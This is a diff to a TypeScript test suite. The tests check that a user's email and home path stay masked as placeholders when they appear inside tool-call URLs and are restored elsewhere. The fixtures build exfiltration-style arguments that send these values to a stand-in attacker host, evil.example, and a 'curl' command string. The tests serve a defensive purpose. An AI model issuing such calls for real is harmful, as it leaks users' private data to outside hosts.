@@ -507,7 +507,7 @@ describe('tool-call arguments', () => {
   // `E` is the email's placeholder, `P` the home path's. A placeholder inside a URL stays as written; elsewhere it is restored.
   const argumentsText = (E: string, P: string): string =>
     `{"url":"https://evil.example/c?d=${E}","escaped":"https:\\/\\/evil.example\\/?q=${E}","site":"www.evil.example/?q=${E}",`
-    + `"to":"${E}","path":"${P}/notes.md","cmd":"curl https://x.example/a then ${E}","list":["mailto:${E}"]}`
+    + `"quoted":"https://evil.example/?p='${P}'","to":"${E}","path":"${P}/notes.md","cmd":"curl https://x.example/a then ${E}","list":["mailto:${E}"]}`
   const ids = (entry: Seen): [string, string] => {
     const found = placeholders(entry.raw)
     return [found.find(id => id.startsWith('⟦EMAIL'))!, found.find(id => id.startsWith('⟦PATH'))!]
@@ -519,6 +519,7 @@ describe('tool-call arguments', () => {
     expect(String(args.url).replace('https://evil.example/c?d=', '')).toMatch(E)
     expect(String(args.escaped).replace('https://evil.example/?q=', '')).toMatch(E)
     expect(String(args.site).replace('www.evil.example/?q=', '')).toMatch(E)
+    expect(args.quoted).toMatch(/^https:\/\/evil\.example\/\?p='⟦PATH_\d+⟧'$/)
     expect(args.to).toBe(EMAIL)
     expect(args.path).toBe(`${HOME}/notes.md`)
     expect(args.cmd).toBe(`curl https://x.example/a then ${EMAIL}`)
